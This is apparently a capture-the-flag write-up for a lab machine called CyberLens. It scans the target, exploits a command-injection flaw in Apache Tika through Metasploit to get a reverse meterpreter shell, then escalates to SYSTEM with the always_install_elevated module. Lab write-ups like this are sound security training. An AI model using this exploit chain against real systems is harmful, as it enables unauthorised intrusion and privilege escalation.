Be sure to add the IP to your /etc/hosts file: `sudo echo '10.10.46.248 cyberlens.thm' >> /etc/hosts`<br />
After an initial scan to check what ports are open, this is the result of a more targeted scan: 

    nmap 10.10.46.248 -p80,135,139,445,3389 -sV -sC -oN scan

Opening the webserver, it seems like it is a service used to get metadata from files, specifically image files.<br />
![image](https://github.com/user-attachments/assets/eed84af8-6657-4663-9e1f-acb6e1439792)<br />
However, as you can see from the image above, one can also upload .sh files, and the service correctly labels it as sh application. 
However, after enumerating a bit the website and capturing requests with burpsuite, I noticed something interesting: <br />
![image](https://github.com/user-attachments/assets/169a4eb3-8c42-42d4-86d5-dbb990934eae)<br />
I'm making requests to port 61777 of the webserver. So I immediatly tried to scan that port to check what it is: <br />

Jetty is simply a web server. So I visited `cyberlens.thm:61777` to see what comes up:<br />
![image](https://github.com/user-attachments/assets/ccf85c00-4d99-4bd9-987f-057283d2d1f0)<br />
Apache Tika is an open source library used to detect and extract metadata from files. This page is apparently showing us the endpoints that we can use to interact with it. And here's an interesting endpoint: <br />
![image](https://github.com/user-attachments/assets/a6891ab3-01c4-4961-8bfe-6fd97d766fe6)<br />
![image](https://github.com/user-attachments/assets/7afb34cb-bc52-433f-80e1-b765a422ad8c)<br />
That endpoint gave me the version of the Tika software that's being used(PS, I just realized that this information was also given by the scan on port 61777, but I'm stupid). After some enumeration, I found out that this Tika version is vulnerable to command injection, and the exploit is available on metasploit. The module name is `windows/http/apache_tika_jp2_jscript`. 
Correctly set up the options, in my case: 

    set LHOST 10.11.85.53
    set rhosts 10.10.46.248
    set rport 61777
    run
And I got a meterpreter session. Inside `C:\Users\Cyberlens\Desktop` we can find user.txt(flags are at the end of this writeup): <br />

Can we get the administrator account?<br />
I decided to use a metasploit module called `multi/recon/local_exploit_suggester`, which tries to find vulnerabilities to escalate privileges within a meterpreter session. 

    multi/recon/local_exploit_suggester
    set session YOUR_SESSION
    run
And this is what it finds: <br />
![image](https://github.com/user-attachments/assets/24cf5fd1-7ceb-4bb0-853c-a82c2bca736f)<br />
So I tried to use the first one: 

    use windows/local/always_install_elevated
    set lhost 10.11.108.100
    set lport 4445
    set session 2
And I'm now the system user, and can locate the admin flag:
